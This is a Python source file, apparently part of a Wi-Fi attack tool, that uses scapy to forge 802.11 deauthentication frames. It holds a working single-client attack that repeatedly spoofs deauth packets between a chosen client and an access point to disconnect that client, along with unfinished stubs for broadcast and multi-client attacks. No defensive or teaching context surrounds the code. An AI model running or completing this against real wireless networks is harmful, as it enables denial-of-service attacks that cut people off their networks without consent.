import struct

from itertools import chain

from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth


class WiFiDeauthAttack(object):
    
    DEFAULT_DEAUTH_REASON = 3

    def __init__(self, interface, bssid):
        self.interface = interface
        self.bssid = bssid
    
    def run(self):
        raise NotImplementedError


class SingleClientDeauthAttack(WiFiDeauthAttack):
    
    INITIAL_SEQ_NUMBER = 0
    PACKETS_PER_PROBE = 2
    NUM_PROBES = 50
    
    def __init__(self, interface, bssid, client):
        super(SingleClientDeauthAttack, self).__init__(interface, bssid)
        self.client = client
        
    def _build_deauth_packet(self, seq, source, dest):
        return RadioTap() /\
               Dot11(SC=seq, addr1=source, addr2=dest, addr3=self.bssid) /\
               Dot11Deauth(reason=self.DEFAULT_DEAUTH_REASON)
    
    def run(self):
        for seq in xrange(self.INITIAL_SEQ_NUMBER,
                          self.INITIAL_SEQ_NUMBER+self.NUM_PROBES):
            client_packet = self._build_deauth_packet(seq,
                                                      source=self.client,
                                                      dest=self.bssid)
            ap_packet = self._build_deauth_packet(seq,
                                                  source=self.bssid,
                                                  dest=self.client)
            packets = [(client_packet, ap_packet)
                       for _ in range(self.PACKETS_PER_PROBE)]
            packets = list(chain.from_iterable(packets))
              
            sendp(packets, iface=self.interface, verbose=0)


class GlobalDisassociationAttack(WiFiDeauthAttack):
    
    WIFI_BROADCAST_ADDRESS = 'ff:ff:ff:ff:ff:ff'

    def run(self):
        # TODO
        pass


class MultipleClientDeauthAttack(WiFiDeauthAttack):

    def __init__(self, interface, bssid, timeout):
        super(MultipleClientDeauthAttack, self).__init__(interface, bssid)
        self.timeout = timeout

    def run(self):
        # TODO
        pass